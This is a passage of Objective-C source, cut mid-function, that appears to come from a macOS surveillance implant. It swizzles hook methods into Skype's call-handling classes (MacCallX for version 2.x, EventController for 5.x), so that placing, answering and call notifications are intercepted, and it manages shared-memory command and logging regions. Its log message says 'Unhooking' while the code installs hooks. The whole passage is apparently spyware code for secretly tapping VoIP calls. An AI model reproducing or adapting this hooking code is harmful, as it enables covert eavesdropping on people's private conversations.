          infoLog(@"Unhooking voip calls");
#endif
          
          // In order to avoid a linker error for a missing implementation
          Class className   = objc_getClass("MacCallX");
          Class classSource = objc_getClass("myMacCallX");
          
          if ([className respondsToSelector: @selector(placeCallTo:)])
            {
              //
              // Skype 2.x
              //
              swizzleByAddingIMP(className,
                                @selector(placeCallTo:),
                                class_getMethodImplementation(classSource,
                                               @selector(placeCallToHook:)),
                                @selector(placeCallToHook:));
              swizzleByAddingIMP(className,
                                 @selector(answer),
                                 class_getMethodImplementation(classSource,
                                                @selector(answerHook)),
                                 @selector(answerHook));
            }
          else
            {
              //
              // Skype 5.x
              //
              Class c1 = objc_getClass("EventController");
              Class c2 = objc_getClass("myEventController");
              
              swizzleByAddingIMP(c1,
                  @selector(handleNotification:),
                  class_getMethodImplementation(c2,
                                    @selector(handleNotificationHook:)),
                  @selector(handleNotificationHook:));
            }
        }
      
      usleep(8000);
      
      [innerPool release];
    }
  /*
  [mSharedMemoryCommand detachFromMemoryRegion];
  [mSharedMemoryCommand release];
  
  [mSharedMemoryLogging detachFromMemoryRegion];
  [mSharedMemoryLogging release];
  */
  [pool release];
}

@end
